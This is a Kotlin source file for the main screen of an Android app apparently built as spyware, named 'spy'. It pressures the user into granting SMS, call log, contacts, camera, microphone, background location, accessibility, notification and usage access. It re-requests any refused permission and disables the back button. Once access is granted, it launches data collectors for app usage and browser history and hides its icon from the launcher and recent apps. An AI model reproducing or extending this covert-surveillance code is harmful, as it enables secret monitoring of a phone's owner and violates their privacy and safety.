package com.gauravhanna.spy

import android.Manifest
import android.app.AppOpsManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val PERMISSION_REQUEST_CODE = 100
        private const val OVERLAY_PERMISSION_REQUEST = 101
        private const val NOTIFICATION_ACCESS_REQUEST = 102
        private const val USAGE_ACCESS_REQUEST = 103
        private const val ACCESSIBILITY_REQUEST = 104
        private const val BACKGROUND_LOCATION_REQUEST = 105
        private const val POST_NOTIFICATIONS_REQUEST = 106
    }

    private var currentPermissionIndex = 0

    // All permissions in sequence
    private val permissionSequence = mutableListOf<PermissionItem>()

    data class PermissionItem(
        val name: String,
        val action: () -> Boolean,
        val request: () -> Unit
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Hide app from recent apps
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask()
        }

        // Start permission flow
        setupPermissionSequence()
        startNextPermission()
    }

    private fun setupPermissionSequence() {
        permissionSequence.clear()

        // 1. Dangerous Permissions
        permissionSequence.add(PermissionItem(
            name = "Storage & Phone Permissions",
            action = { hasDangerousPermissions() },
            request = { requestDangerousPermissions() }
        ))

        // 2. Overlay Permission (Draw over other apps)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            permissionSequence.add(PermissionItem(
                name = "Overlay Permission",
                action = { Settings.canDrawOverlays(this) },
                request = { requestOverlayPermission() }
            ))
        }

        // 3. Notification Access
        permissionSequence.add(PermissionItem(
            name = "Notification Access",
            action = { hasNotificationAccess() },
            request = { requestNotificationAccess() }
        ))

        // 4. Usage Access
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            permissionSequence.add(PermissionItem(
                name = "Usage Access",
                action = { hasUsageAccess() },
                request = { requestUsageAccess() }
            ))
        }

        // 5. Accessibility Service
        permissionSequence.add(PermissionItem(
            name = "Accessibility Service",
            action = { isAccessibilityEnabled() },
            request = { requestAccessibility() }
        ))

        // 6. Background Location (Android 10+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissionSequence.add(PermissionItem(
                name = "Background Location",
                action = { hasBackgroundLocation() },
                request = { requestBackgroundLocation() }
            ))
        }

        // 7. Notifications (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionSequence.add(PermissionItem(
                name = "Notifications",
                action = { hasPostNotifications() },
                request = { requestPostNotifications() }
            ))
        }
    }

    private fun hasDangerousPermissions(): Boolean {
        val permissions = listOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )
        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestDangerousPermissions() {
        val permissions = listOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        ).toTypedArray()

        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE)
    }

    private fun hasNotificationAccess(): Boolean {
        return try {
            val enabledListeners = Settings.Secure.getString(
                contentResolver,
                "enabled_notification_listeners"
            )
            enabledListeners?.contains(packageName) == true
        } catch (e: Exception) {
            false
        }
    }

    private fun requestNotificationAccess() {
        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        startActivityForResult(intent, NOTIFICATION_ACCESS_REQUEST)
    }

    private fun hasUsageAccess(): Boolean {
        try {
            val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                appOps.unsafeCheckOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(),
                    packageName
                )
            } else {
                @Suppress("DEPRECATION")
                appOps.checkOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(),
                    packageName
                )
            }
            return mode == AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) {
            return false
        }
    }

    private fun requestUsageAccess() {
        val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
        startActivityForResult(intent, USAGE_ACCESS_REQUEST)
    }

    private fun isAccessibilityEnabled(): Boolean {
        return try {
            val enabledServices = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            )
            enabledServices?.contains(packageName) == true
        } catch (e: Exception) {
            false
        }
    }

    private fun requestAccessibility() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivityForResult(intent, ACCESSIBILITY_REQUEST)
    }

    private fun hasBackgroundLocation(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestBackgroundLocation() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
            BACKGROUND_LOCATION_REQUEST
        )
    }

    private fun hasPostNotifications(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.POST_NOTIFICATIONS
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestPostNotifications() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(Manifest.permission.POST_NOTIFICATIONS),
            POST_NOTIFICATIONS_REQUEST
        )
    }

    private fun requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST)
        }
    }

    private fun startNextPermission() {
        while (currentPermissionIndex < permissionSequence.size) {
            val permission = permissionSequence[currentPermissionIndex]
            if (permission.action.invoke()) {
                // Permission already granted, move to next
                currentPermissionIndex++
                continue
            } else {
                // Request this permission
                permission.request.invoke()
                return
            }
        }

        // All permissions granted - start service and hide app
        allPermissionsGranted()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
            // Permission granted, move to next
            currentPermissionIndex++
            startNextPermission()
        } else {
            // Permission denied, try again after 1 second
            Handler(Looper.getMainLooper()).postDelayed({
                startNextPermission()
            }, 1000)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        // Wait a bit for permission to be registered
        Handler(Looper.getMainLooper()).postDelayed({
            currentPermissionIndex++
            startNextPermission()
        }, 1500)
    }

    private fun allPermissionsGranted() {
        Log.d(TAG, "All permissions granted!")

        // Start background service
        startBackgroundService()

        // Hide app from launcher and recent apps
        hideApp()

        // Finish activity
        finishAffinity()
    }

    private fun startBackgroundService() {
        val intent = Intent(this, BackgroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        // Start other services
        startService(Intent(this, LocationService::class.java))
        startService(Intent(this, NotificationListener::class.java))

        // Start collectors
        DataCollector.start(this)
        AppUsageCollector.start(this)
        BrowserHistoryHelper.start(this)
    }

    private fun hideApp() {
        // Hide app from launcher
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )

        // Clear recent apps
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask()
        }

        // Move to background
        moveTaskToBack(true)
    }

    override fun onBackPressed() {
        // Disable back button during permission flow
        // Do nothing - prevents user from exiting
    }
}